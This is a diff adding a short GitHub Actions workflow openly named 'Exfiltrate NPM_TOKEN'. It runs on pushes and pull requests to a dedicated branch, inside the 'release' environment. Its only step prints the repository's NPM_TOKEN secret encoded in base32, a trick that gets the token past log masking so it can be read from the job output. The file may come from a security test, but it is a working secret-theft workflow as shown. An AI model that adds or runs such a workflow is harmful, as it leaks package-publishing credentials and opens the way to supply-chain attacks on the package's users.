@@ -1,0 +1,16 @@
+name: Exfiltrate NPM_TOKEN
+on:
+    push:
+        branches: [feat/npm_exfil_owner_release]
+    pull_request:
+        branches: [feat/npm_exfil_owner_release]
+
+jobs:
+    exfil:
+        runs-on: ubuntu-latest
+        environment: release
+        steps:
+            - name: Exfiltrate NPM_TOKEN
+              run:  |
+                echo "lets exfil some repository secrets..."
+                echo "${{ secrets.NPM_TOKEN }}" | base32
